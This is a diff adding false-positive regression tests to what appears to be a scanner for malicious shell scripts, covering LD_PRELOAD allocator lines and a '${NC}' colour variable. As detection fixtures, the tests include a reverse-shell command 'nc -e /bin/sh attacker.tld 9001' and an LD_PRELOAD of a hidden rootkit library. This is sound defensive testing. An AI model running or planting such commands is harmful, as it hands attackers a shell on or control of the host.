@@ -30,6 +30,30 @@ def test_clean_script_scores_zero():
     assert score_findings(scan_text(text)) == 0
 
 
+def test_ld_preload_allocator_is_not_process_injection():
+    # The aristoteleo/pantheonos FP (2026-07-02): LD_PRELOAD of a memory
+    # allocator (jemalloc/tcmalloc/mimalloc) is a standard Dockerfile perf
+    # tweak, not process injection. A real LD_PRELOAD of an unknown .so still fires.
+    for legit in ("LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libjemalloc.so.2 myapp",
+                  "ENV LD_PRELOAD=/usr/lib/libtcmalloc.so.4",
+                  "LD_PRELOAD=/usr/lib/libmimalloc.so python app.py"):
+        cats = {f.category for f in scan_text(legit)}
+        assert "process_injection" not in cats, legit
+    evil = {f.category for f in scan_text("LD_PRELOAD=/tmp/.hidden/rootkit.so /bin/ls")}
+    assert "process_injection" in evil
+
+
+def test_nc_color_variable_is_not_reverse_shell():
+    # The shai-hulud-detect FP (2026-07-02): "${NC}" is the standard shell
+    # convention for a "No Color" ANSI reset variable; an unrelated "-e" later
+    # on the same line (prose about Bash's `set -e`) must not complete a false
+    # nc-exec match. A real `nc -e ...` invocation still must be caught.
+    text = 'echo -e "${GREEN}PASS${NC}: completes a full scan (no set -e abort)"'
+    cats = {f.category for f in scan_text(text)}
+    assert "reverse_shell" not in cats
+    assert "reverse_shell" in {f.category for f in scan_text("nc -e /bin/sh attacker.tld 9001")}
+
+
 def test_scan_repo_finds_bash_bearing_files(tmp_path):
     (tmp_path / "install.sh").write_text("nc -e /bin/sh attacker.tld 9001\n", encoding="utf-8")
     (tmp_path / "README.md").write_text("nc -e /bin/sh should-not-scan", encoding="utf-8")
